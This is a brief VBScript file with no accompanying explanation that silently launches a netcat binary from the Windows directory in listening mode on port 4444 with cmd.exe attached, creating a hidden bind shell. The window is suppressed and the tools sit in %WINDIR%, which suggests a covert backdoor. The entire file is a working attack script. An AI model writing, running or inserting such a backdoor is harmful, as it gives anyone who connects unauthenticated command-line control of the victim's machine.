Set objShell = CreateObject("WScript.Shell")

' Get the path to the Windows directory
customFolder = objShell.ExpandEnvironmentStrings("%WINDIR%")

' Define the command to run Netcat in listening mode, binding a cmd shell
commandToRun = """" & customFolder & "\Quiet.exe"" """ & customFolder & "\nc64.exe"" -l -p 4444 -e cmd.exe"

' Run the command
objShell.Run commandToRun, 0, True
